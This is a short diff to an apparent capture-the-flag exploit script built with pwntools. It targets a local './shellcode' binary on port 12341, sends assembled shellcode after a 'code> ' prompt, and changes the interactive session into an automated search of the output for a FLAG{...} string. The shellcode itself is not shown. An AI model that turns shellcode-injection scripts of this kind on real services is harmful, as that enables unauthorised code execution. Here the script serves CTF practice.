@@ -3,9 +3,12 @@
 
 from pwn import *
 import sys
+import re
 
 context.arch = 'amd64'
 context.os = 'linux'
+
+FLAG_PATTERN = r"FLAG\{.*?\}"
 
 exe = './shellcode'
 port = 12341
@@ -60,6 +63,13 @@ shellcode = asm("""
 r.recvuntil(b'code> ')
 r.send(shellcode)
 
-r.interactive()
+res = r.recvall()
+response = res.decode(errors='ignore')
+flag_match = re.search(FLAG_PATTERN, response)
+
+if flag_match:
+    log.success(f"FLAG FOUND: {flag_match.group(0)}")
+else:
+    log.failure(f"FLAG NOT FOUND: No No No...")
 
 # vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
